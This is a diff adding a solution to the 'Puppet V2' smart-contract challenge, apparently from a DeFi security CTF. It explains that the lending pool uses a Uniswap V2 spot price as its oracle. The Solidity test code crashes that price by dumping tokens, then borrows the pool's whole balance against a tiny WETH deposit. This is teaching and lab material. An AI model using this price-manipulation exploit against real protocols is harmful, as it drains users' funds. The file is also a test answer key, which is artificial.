@@ -98,7 +98,56 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * Same as Puppet V1 - the pool uses Uniswap V2 spot price as oracle:
+         *   price = reservesWETH / reservesToken
+         *
+         * By dumping tokens into Uniswap, we crash the spot price, making
+         * the required WETH deposit much smaller than the tokens' actual value.
+         *
+         * Initial state:
+         * - Uniswap: 10 WETH, 100 DVT → price = 0.1 WETH/DVT
+         * - Deposit for 1M DVT = 1M * 0.1 * 3 = 300k WETH (too much!)
+         *
+         * After dumping 10k DVT:
+         * - Uniswap: ~0.099 WETH, 10100 DVT → price ≈ 0.00001 WETH/DVT
+         * - Deposit for 1M DVT = ~29 WETH (affordable!)
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Swap all DVT for WETH on Uniswap (crashes price, gives us more WETH)
+         * 2. Wrap our ETH to WETH
+         * 3. Borrow all tokens from pool with manipulated low deposit
+         * 4. Transfer tokens to recovery
+         */
+
+        // Step 1: Swap all DVT tokens for WETH (crashes the price)
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        
+        uniswapV2Router.swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,  // minimum WETH to receive
+            path,
+            player,
+            block.timestamp + 1
+        );
+
+        // Step 2: Wrap our remaining ETH to WETH
+        weth.deposit{value: player.balance}();
+
+        // Step 3: Calculate deposit needed and borrow all tokens
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        
+        // Approve and borrow
+        weth.approve(address(lendingPool), depositRequired);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // Step 4: Transfer all tokens to recovery
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
